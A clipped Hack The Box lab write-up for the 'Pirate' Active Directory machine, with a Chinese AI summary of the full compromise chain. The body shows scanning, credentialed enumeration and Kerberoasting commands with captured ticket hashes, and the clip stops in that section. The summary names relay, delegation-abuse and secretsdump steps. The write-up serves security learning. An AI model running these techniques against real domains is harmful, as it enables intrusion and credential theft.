---
title: "HTB: Pirate | 0xdf hacks stuff"
source: https://0xdf.gitlab.io/2026/09/05/htb-pirate.html
source_host: 0xdf.gitlab.io
clip_date: 2026-09-17T10:51:18+08:00
trace_id: b152606e-fafb-450f-999d-ade8684c8c0d
content_hash: 89704c35a0b4b45018822cdce0aa7ca473a320df63d70b6658859e21d4f20b4a
status: synced
tags:
  - CTF
  - 漏洞分析
series: null
feed_source: 0xdf·HTB/逆向
ai_summary: AD 假设失陷的 Windows 域内渗透链：从低权域账号出发，经 pre2k 机器账号、GMSA 读取、RBCD 与 SPN 劫持，最终拿下 DC01 的 Administrator。
ai_summary_style: key-points
images_status:
  total: 13
  succeeded: 10
  failed_urls:
    - https://www.hackthebox.com/badge/image/458607
    - https://www.hackthebox.com/badge/image/647734
    - https://www.hackthebox.com/badge/image/1253217
notion_page_id: 3de75244-d011-81ee-b027-cc77bf8dbeb3
ioc:
  cves: []
  cwes: []
  hashes:
    - 01cffc2ef9a91d20107371f9a4a4112c892ed989
    - 1430191bce4f3731edd34d8c24a56c23
    - 199396b8209e11c928bc9667e9e5d51c
    - 31d6cfe0d16ae931b73c59d7e0c089c0
    - 342dfe90cc4061078b79f011cd08f931
    - 366c8924be3ea6d1d12825569a4bcc39
    - 57b48ef53425adf16b2409ea4d980de1007c9f61b126bdc1c05d3d830c727526
    - 598295e78bd72d66f837997baf715171
    - 60da2d3ba00d6b5932e4c87dce6fa6b4
    - 66812dfee46ff41c9c8245a2819c3183
    - 7ab7e5b8e8c440068cb254a33a49973f
    - 8baf09ddc5830ac4456ee8639dd89644
    - 9918bbcfaaad184f895a36edb7aab5bff972912dcf436cf490fc6618cf7bfb56
    - a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11
    - a4fddb1b2df2db7cc3d044dc1b559bc1b45a1de9
    - aad3b435b51404eeaad3b435b51404ee
    - b1aac1584c2ea8ed0a9429684e4fc3e5
    - b6b018d4edd476f0999d6f666844cf77
    - bb510d80e8ed89f4cc81a1f1d374e164
    - c82466882632cef3b14d796ff6ae6ee8
    - feba09cf0013fbf5834f50def734bca9
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> AD 假设失陷的 Windows 域内渗透链：从低权域账号出发，经 pre2k 机器账号、GMSA 读取、RBCD 与 SPN 劫持，最终拿下 DC01 的 Administrator。
> 
> - **初始条件：** 域 pirate.htb，主机 DC01，凭证 pentest / p3nt3st2025!& 可用 SMB 与 LDAP，不可 WinRM；Kerberos 操作前需 `sudo ntpdate DC01.pirate.htb` 校正时钟偏移。
> - **pre2k 突破：** PRE-WINDOWS 2000 COMPATIBLE ACCESS 组中的 MS01$、EXCH01$ 密码为小写主机名，`netexec -M pre2k` 拿到 TGT；MS01 属 Domain Secure Servers，可读两个 gMSA 密码，其中 gMSA_ADFS_prod$ 在 Remote Management Users 内，可 WinRM 登录 DC01。
> - **RBCD 横移：** 从 DC01 隧道进入内部 WEB01，强制 WEB01$ 认证并降级/中继，写入基于资源的约束委派，以管理员拿下 WEB01，转储凭据得到 A.White（可重置 A.White_adm 密码）。
> - **SPN 劫持拿域管：** a.white_adm 对 HTTP/WEB01 有协议转换约束委派，IT 组又对计算机对象有 WriteSPN；用 bloodyAD 把该 SPN 从 WEB01 移到 DC01，`getST.py` 走 S4U2Self/S4U2Proxy 并加 `-altservice CIFS/DC01.pirate.htb` 换服务类，再 secretsdump 取 Administrator 哈希并 WinRM 登录。
> - **Beyond Root：** 捷径为 RemotePotato0 触发跨会话认证，`socat` 把 135 转发到伪造 Oxid 解析器 9999，`ntlmrelayx.py -t ldaps://DC01 -i --remove-mic` 中继得 LDAP shell 改 A.White_adm 密码；WEB01 上 WinRM 只认本机 Remote Management Users 组，故仅 gMSA_ADFS_prod$ 可登录。

[HTB: Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/pirate-cover.webp)

Pirate is a Windows assume-breach Active Directory box, providing credentials for a low-privileged domain account. Enumerating the domain, I’ll find pre-Windows 2000 machine accounts whose passwords match their hostnames, and one belongs to a group allowed to read group-managed service account passwords, which gets me a WinRM shell on the domain controller. From there I’ll tunnel to an internal web server and coerce its machine account into authenticating, then downgrade and relay that authentication to configure resource-based constrained delegation and take over that host as Administrator. Dumping its secrets exposes a user who can reset another account’s password, and that account has constrained delegation I’ll abuse with an SPN-jacking attack, moving a service principal name onto the domain controller and switching service classes to impersonate the domain administrator. In Beyond Root, I’ll show an alternate cross-session relay with RemotePotato0.

## Box Info

[![Pirate](https://0xdf.gitlab.io/icons/box-pirate.webp)](https://hackthebox.com/machines/pirate)

[Pirate](https://hackthebox.com/machines/pirate)

Hard

Retire Date 05 Sep 2026

OS ![Windows](https://0xdf.gitlab.io/icons/Windows.webp)

Rated Difficulty ![Rated difficulty for Pirate](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/pirate-diff.webp)

![Rated difficulty for Pirate](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/129d931c64514aa8.png)

Radar Graph ![Radar chart for Pirate](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/pirate-radar.webp)

![Radar chart for Pirate](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cd946cce387e9caa.png)

User

00:30:33 [Pyp](https://app.hackthebox.com/users/458607)

![⚠️ 图片托管失败 · Pyp](https://www.hackthebox.com/badge/image/458607)

Root

00:41:30 [Mojo098](https://app.hackthebox.com/users/647734)

![⚠️ 图片托管失败 · Mojo098](https://www.hackthebox.com/badge/image/647734)

Creator [ruycr4ft](https://app.hackthebox.com/users/1253217)

![⚠️ 图片托管失败 · ruycr4ft](https://www.hackthebox.com/badge/image/1253217)

Scenario

As is common in real life pentests, you will start the Pirate box with credentials for the following account pentest / p3nt3st2025!&

## Recon

### Initial Scanning

`nmap` finds twenty-two open TCP ports:

```
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.60.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-11 23:51 UTC
Nmap scan report for 10.129.60.234
Host is up, received echo-reply ttl 127 (0.020s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 126
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2179/tcp  open  vmrdp            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127
49920/tcp open  unknown          syn-ack ttl 127
60147/tcp open  unknown          syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 20.02 seconds
oxdf@hacky$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,2179,3268,3269,5985,9389,49667,49689,49690,49693,49696,49920,60147 -sCV 10.129.60.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-11 23:53 UTC
Nmap scan report for 10.129.60.234
Host is up (0.021s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-12 00:16:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-08-12T00:18:09+00:00; +22m53s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-08-12T00:01:35
|_Not valid after:  2027-08-12T00:01:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-08-12T00:18:09+00:00; +22m53s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-08-12T00:01:35
|_Not valid after:  2027-08-12T00:01:35
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-08-12T00:01:35
|_Not valid after:  2027-08-12T00:01:35
|_ssl-date: 2026-08-12T00:18:09+00:00; +22m53s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-08-12T00:18:09+00:00; +22m53s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-08-12T00:01:35
|_Not valid after:  2027-08-12T00:01:35
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49920/tcp open  msrpc         Microsoft Windows RPC
60147/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-08-12T00:17:31
|_  start_date: N/A
|_clock-skew: mean: 22m52s, deviation: 0s, median: 22m52s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.82 seconds
```

The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `pirate.htb`, and the hostname is `DC01`.

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

```bash
oxdf@hacky$ netexec smb 10.129.60.234 --generate-hosts-file hosts                                   
SMB         10.129.60.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
oxdf@hacky$ cat hosts /etc/hosts | sponge | tee /etc/hosts | head -1
10.129.60.234     DC01.pirate.htb pirate.htb DC01
```

`nmap` shows that there is one additional hop to get to the webserver, which I can show more explicitly with `lft`:

```
oxdf@hacky$ sudo lft 10.129.60.234:88
Tracing .....T
TTL LFT trace to DC01.pirate.htb (10.129.60.234):88/tcp
 1  10.10.14.1 19.4ms
 2  [target open] DC01.pirate.htb (10.129.60.234):88 58.4ms
oxdf@hacky$ sudo lft 10.129.60.234:80
Tracing ....T
TTL LFT trace to DC01.pirate.htb (10.129.60.234):80/tcp
 1  10.10.14.1 18.5ms
 2  DC01.pirate.htb (10.129.60.234) 19.4ms
 3  [target open] DC01.pirate.htb (10.129.60.234):80 28.3ms
```

That implies it’s running in a container or VM. The rest of the ports show TTL of 127, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Windows one hop away.

`nmap` notes a clock skew, so I’ll want to make sure to run `sudo ntpdate DC01.pirate.htb` before any actions that use Kerberos auth.

### Initial Credentials

HackTheBox provides the following scenario associated with Pirate:

As is common in real life pentests, you will start the Pirate box with credentials for the following account pentest / p3nt3st2025!&

The creds do work:

```css
oxdf@hacky$ netexec smb DC01.pirate.htb -u pentest -p 'p3nt3st2025!&'
SMB         10.129.60.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.60.234   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
```

They also work for LDAP, but not WinRM (unsurprisingly):

```css
oxdf@hacky$ netexec ldap DC01.pirate.htb -u pentest -p 'p3nt3st2025!&'
LDAP        10.129.60.234   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.60.234   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
oxdf@hacky$ netexec winrm DC01.pirate.htb -u pentest -p 'p3nt3st2025!&'
WINRM       10.129.60.234   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) 
WINRM       10.129.60.234   5985   DC01             [-] pirate.htb\pentest:p3nt3st2025!&
```

I’ll note that SMB signing is enabled, but LDAP is not.

I’ll want to prioritize things like:

-   SMB shares
-   Bloodhound (which includes most of the data from LDAP)
-   ADCS

### SMB - TCP 445

#### Shares

The pentest user can see to the default domain controller shares:

```sql
oxdf@hacky$ netexec smb DC01.pirate.htb -u pentest -p 'p3nt3st2025!&' --shares
SMB         10.129.60.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.60.234   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
SMB         10.129.60.234   445    DC01             [*] Enumerated shares
SMB         10.129.60.234   445    DC01             Share           Permissions     Remark
SMB         10.129.60.234   445    DC01             -----           -----------     ------
SMB         10.129.60.234   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.60.234   445    DC01             C$                              Default share
SMB         10.129.60.234   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.60.234   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.60.234   445    DC01             SYSVOL          READ            Logon server share 
```

There’s nothing interesting here.

#### Users

`netexec` finds seven users over SMB:

```sql
oxdf@hacky$ netexec smb DC01.pirate.htb -u pentest -p 'p3nt3st2025!&' --users
SMB         10.129.60.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.60.234   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
SMB         10.129.60.234   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.60.234   445    DC01             Administrator                 2025-06-08 14:32:36 0       Built-in account for administering the computer/domain 
SMB         10.129.60.234   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.60.234   445    DC01             krbtgt                        2025-06-08 14:40:29 0       Key Distribution Center Service Account 
SMB         10.129.60.234   445    DC01             a.white_adm                   2026-01-16 00:36:34 0        
SMB         10.129.60.234   445    DC01             a.white                       2025-06-08 19:33:01 0        
SMB         10.129.60.234   445    DC01             pentest                       2025-06-09 13:40:23 0        
SMB         10.129.60.234   445    DC01             j.sparrow                     2025-06-09 15:08:44 0        
SMB         10.129.60.234   445    DC01             [*] Enumerated 7 local users: PIRATE
```

j.sparrow, a.white, and a.white_adm are the most interesting.

A RID brute force shows the same information, with less filtering:

```rust
oxdf@hacky$ netexec smb DC01.pirate.htb -u pentest -p 'p3nt3st2025!&' --rid-brute
SMB         10.129.60.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.60.234   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
SMB         10.129.60.234   445    DC01             498: PIRATE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.60.234   445    DC01             500: PIRATE\Administrator (SidTypeUser)
SMB         10.129.60.234   445    DC01             501: PIRATE\Guest (SidTypeUser)
SMB         10.129.60.234   445    DC01             502: PIRATE\krbtgt (SidTypeUser)
SMB         10.129.60.234   445    DC01             512: PIRATE\Domain Admins (SidTypeGroup)
SMB         10.129.60.234   445    DC01             513: PIRATE\Domain Users (SidTypeGroup)
SMB         10.129.60.234   445    DC01             514: PIRATE\Domain Guests (SidTypeGroup)
SMB         10.129.60.234   445    DC01             515: PIRATE\Domain Computers (SidTypeGroup)
SMB         10.129.60.234   445    DC01             516: PIRATE\Domain Controllers (SidTypeGroup)
SMB         10.129.60.234   445    DC01             517: PIRATE\Cert Publishers (SidTypeAlias)
SMB         10.129.60.234   445    DC01             518: PIRATE\Schema Admins (SidTypeGroup)
SMB         10.129.60.234   445    DC01             519: PIRATE\Enterprise Admins (SidTypeGroup)
SMB         10.129.60.234   445    DC01             520: PIRATE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.60.234   445    DC01             521: PIRATE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.60.234   445    DC01             522: PIRATE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.60.234   445    DC01             525: PIRATE\Protected Users (SidTypeGroup)
SMB         10.129.60.234   445    DC01             526: PIRATE\Key Admins (SidTypeGroup)
SMB         10.129.60.234   445    DC01             527: PIRATE\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.60.234   445    DC01             553: PIRATE\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.60.234   445    DC01             571: PIRATE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.60.234   445    DC01             572: PIRATE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.60.234   445    DC01             1000: PIRATE\DC01$ (SidTypeUser)
SMB         10.129.60.234   445    DC01             1101: PIRATE\DnsAdmins (SidTypeAlias)
SMB         10.129.60.234   445    DC01             1102: PIRATE\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.60.234   445    DC01             1103: PIRATE\IT (SidTypeGroup)
SMB         10.129.60.234   445    DC01             1104: PIRATE\a.white_adm (SidTypeUser)
SMB         10.129.60.234   445    DC01             3101: PIRATE\a.white (SidTypeUser)
SMB         10.129.60.234   445    DC01             3102: PIRATE\WEB01$ (SidTypeUser)
```

Most interesting in the WEB01$ machine account, which lines up nicely with the idea that the webserver is on another VM.

### Website - TCP 80

#### Site

The website is the default IIS page:

![image-20260811144642420](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3edfd401b729aa3b.png)

![image-20260811144642420](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260811144642420.webp)

#### Tech Stack

The HTTP response headers show just IIS:

```yaml
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Sun, 08 Jun 2025 20:38:47 GMT
Accept-Ranges: bytes
ETag: "3d769255b5d8db1:0"
Server: Microsoft-IIS/10.0
Date: Wed, 12 Aug 2026 07:46:22 GMT
Content-Length: 703
```

The main page loads as `/iisstart.htm`, as is common for the default install.

The 404 page matches the default [IIS 404](https://0xdf.gitlab.io/cheatsheets/404#iis):

![image-20260811144809755](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260811144809755.webp)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```sql
oxdf@hacky$ feroxbuster -u http://pirate.htb
                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://pirate.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      334l     2089w   180418c http://pirate.htb/iisstart.png
200      GET       32l       55w      703c http://pirate.htb/
400      GET        6l       26w      324c http://pirate.htb/error%1F_log
[####################] - 15s    30003/30003   0s      found:3       errors:0      
[####################] - 15s    30000/30000   2045/s  http://pirate.htb/
```

It finds nothing here.

### LDAP - TCP 389 (and others)

#### Users

I can get the same user list over LDAP:

```
oxdf@hacky$ netexec ldap DC01.pirate.htb -u pentest -p 'p3nt3st2025!&' --users
LDAP        10.129.60.234   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.60.234   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
LDAP        10.129.60.234   389    DC01             [*] Enumerated 7 domain users: pirate.htb
LDAP        10.129.60.234   389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.60.234   389    DC01             Administrator                 2025-06-08 14:32:36 0        Built-in account for administering the computer/domain      
LDAP        10.129.60.234   389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.60.234   389    DC01             krbtgt                        2025-06-08 14:40:29 0        Key Distribution Center Service Account                     
LDAP        10.129.60.234   389    DC01             a.white_adm                   2026-01-16 00:36:34 0                                                                    
LDAP        10.129.60.234   389    DC01             a.white                       2025-06-08 19:33:01 0                                                                    
LDAP        10.129.60.234   389    DC01             pentest                       2025-06-09 13:40:23 0                                                                    
LDAP        10.129.60.234   389    DC01             j.sparrow                     2025-06-09 15:08:44 0  
```

#### GMSA

I’m trying to get in the habit of checking for GMSA credentials immediately upon getting credentials for the domain, just to know what might be a target account.

```css
oxdf@hacky$ netexec ldap pirate.htb -u pentest -p 'p3nt3st2025!&' --gmsa
LDAP        10.129.60.234   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.60.234   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
LDAP        10.129.60.234   389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.60.234   389    DC01             Account: gMSA_ADCS_prod$      NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAP        10.129.60.234   389    DC01             Account: gMSA_ADFS_prod$      NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: Domain Secure Servers
```

There are two users with GMSA passwords set, and the Domain Secure Servers group is what can read them.

#### Kerberoast

I am able to Kerberoast two users:

```ruby
oxdf@hacky$ netexec ldap pirate.htb -u pentest -p 'p3nt3st2025!&' --kerberoasting kerberoast.txt
LDAP        10.129.60.234   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.60.234   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
LDAP        10.129.60.234   389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.60.234   389    DC01             [*] Total of records returned 2
LDAP        10.129.60.234   389    DC01             [*] sAMAccountName: a.white_adm, memberOf: CN=IT,CN=Users,DC=pirate,DC=htb, pwdLastSet: 2026-01-16 00:36:34.388000, lastLogon: 2025-06-09 16:03:37.380258
LDAP        10.129.60.234   389    DC01             $krb5tgs$23$*a.white_adm$PIRATE.HTB$pirate.htb\a.white_adm*$199396b8209e11c928bc9667e9e5d51c$3a8729973583aaf2006ff730307b200e2e516231131ce865a9365c1734b127619aa9c31041221fdc2695cc802e3c4b9991a243968484795310afc00d492ed6186b944648761d49861b4a630d1eb9d4b166b7bb70af33d834a406a7fc2ebd36d2a052dcabe14c94d5afd40bccf30f3d5f9b7cc720490d9b3acc09ed9b6c53c2e55b30be6698f1b65e4cf8e1a83efcc1ba51c2060444588d43733ac1d86b0ce1a1df64cd070c7f3d75298efe881c03c2b8cec57bf984673b782ebb97c1f2159d937bbf040374f35d2ed604b3487d599fa75ea558fc33288bb8b4563a64538932cbbefbbac62e96045e9120684288d0dc9aa5483bc8015a6ec1fe848dcfb906ca0d72b6b35decba2b024c5eb088d16cdc9cb284e1162ac6238a841c36930182d3734017e45aa6f8b2eeba699489c2118724f9c0e861df77ef57a7792369b325f5e22dd0c096ce6318e99288d738a6e35d171da3f614dd0147b0d8cee51e24a65eddc4ad4c05c2b9870817428ec792873f8619cfba3176a305b5113d3376650671a7f2bb72a0a8aa466d244f881201d7ed98f9acf7885755f5795ffe88aaf5bc44fbc09666605ca54df2aec7d9acd54fa84ad4ede4598de5bb0bb85257b9241d42f475a6376dcef61cae9d274ccdc5fe75492fc2be41648dcd22cad6bd4fa884117f1d1ff840462007a6b79e738e1a65a78203ef4354a1f7f0e0fb91194f5624ac8ed36b29a44e7382fb5c1bff8a07d57c81e6860e791bc94a84c88be73e990a59d60daaf477dab9ce648ebf9ff8913beb8e25796100dd5be200ffb711ecbdba82952dc607ef170bf92be7e89825f15effa95de06d590ea619db2450e78f8f0cc91c5dc1e947157664887ec17500e798aa20903fc8531f43dfa37e69ab349260e9838c45535bfa677b26ef4b4d24e8a0e91871bd9260015d77c99ee3238a52c17960e33eb9a326d1742aa90e24905002dea635f26b169953a0be1473bf31648e5992ee27c55e6f0867661fe206e3e38a647624a2125c4327668b9c889f3b4f0264d1dc6442180dc7e64cb274d6ecb0226691fbef963188bb1fef810990cd3cc4e58a8aaba068e3d9d058254f2c1fb0ba4568863122d1c0f0c66f476932fd43833bd6a705f90a27905cbfe2a8d94a0394d85984bb41941da055549ae00e19b3191dc2e38a5bc9e08e5bdd3fba40b67fe2e09fa92a02818b99ff4fdb7479293eb3048b2c119757fd9369e3089ea4a5c01caa129facd0c7d2448a12c1f3239491f98a50a95971dedc1bef2209b86e4f1b7dd707660a9e54d0d8a82f46a84da68b61c1daad3c78ccf2f3456460d63229ee04cc5fbf7dc1b1920a3d40779247218924f17531ea70e8140b5b71ccd61179f3a8ca7d18abd171e4bcdc23d7d607393ad45eb1743f0dddfba0c1025589078062119f45491491c933682c08195ab57e58d6c8dec1e30fe52258a75e340c
LDAP        10.129.60.234   389    DC01             [*] sAMAccountName: gMSA_ADFS_prod$, memberOf: CN=Remote Management Users,CN=Builtin,DC=pirate,DC=htb, pwdLastSet: 2025-06-09 14:48:41.108220, lastLogon: 2026-08-12 00:13:57.823018
LDAP        10.129.60.234   389    DC01             $krb5tgs$18$hostgmsa_adfs_prod.pirate.htb$PIRATE.HTB$*pirate.htb\gMSA_ADFS_prod$*$0527105827c27465822fd3c6$06c308d5eed513f1e59c54f97833c609c787114fef64e77213194f54454a5f34d06a344934216a8d03014a641623ba0a03698f6f5f03c48ce14a51f288e609cb2ce3ac583a2d0fdb5c3f4731682e2f9264d08024903c6e3f8b1a1be471ca9ebb4f111569d0e6193e4c856cc51d4a09c8a711105b29ea7d415f971192c949a3d7c2fb4f1820b5631896ee3fcf9ab7eac008328cf09778e0ef550f7ce6053ddadfca847b93daca5d524db80ba17d2cdb3e28f4b3db84a30794568b81862603cd057ecd2d406a8d8fa7e7b33a2c2fb952475c95f928000624aabaf1228a2f2aeab848ea00339d56c6949d6b27328dfbdcf4dd8997edde3ab07bfbecd4b36c4a5ee74ec7dc4b4b968b4d07f3477e4189aa2a203e5e1f6e94f4e47628256c917dab88d2bda3ce5f908c8f119948170aaf483a9e45247bf07ee11cf291f725e416d561e67f954dc31dbdc858b8ca2f0580cd93cf91bd4c7b21ddbcb2b3d3a08b889de5e22002b39dc16037e7a4aa834ac5d1837d47d07cc1cfcc2b24269f83b7703a945cd9692a12587566c89798f87527413cd4066fc81bd9d8eef14fa32278bdb096054fe0222a0a98e3323cce6a44c37d4cca4f2259365fb7f57180f8c666b22ff25b7d9472133c888e33d42c55575416ab3bfbfbc11c62d9139d78daee4013e979833f71f55b71d61e553c1dafd30aa9167adff53f9c2ce1dea7ee1346ad7920d80334e7b423927305fe0a34df55079be3ce276fc7d4c4ed1b41b30ec83965067601040c0a7f36ace1c5823811a14fe81ffbd552051e2724426c617b8b64104e3b27ee26d9706b9c77f97e6d9792012b4c707832f6e4dc00b98345db7fce46c3abe56c280fd950dd96edf38af0dffa35e5c53a8b43941ecc89b04b3d210740412c373c334192afb1a626741508c33476eaa04d7198f4ab8c9673232ee96e8c26aa4878d9f5b5c1c8c4515df5ec29b25f35aee60bb82d5d991438a6fcbe25d2049089962040f788c8d16b397c887e8d526d1af6bffc2c3135314559012e1bec145801c5c8ae271ee03a2a48ed046fc19afd81b5e28244accbb7f14bca99c0285fddf3d35acbc6db0b58675ba50e4b31e0a853a36ec4613e17c85f6b3d49fc97611a57659f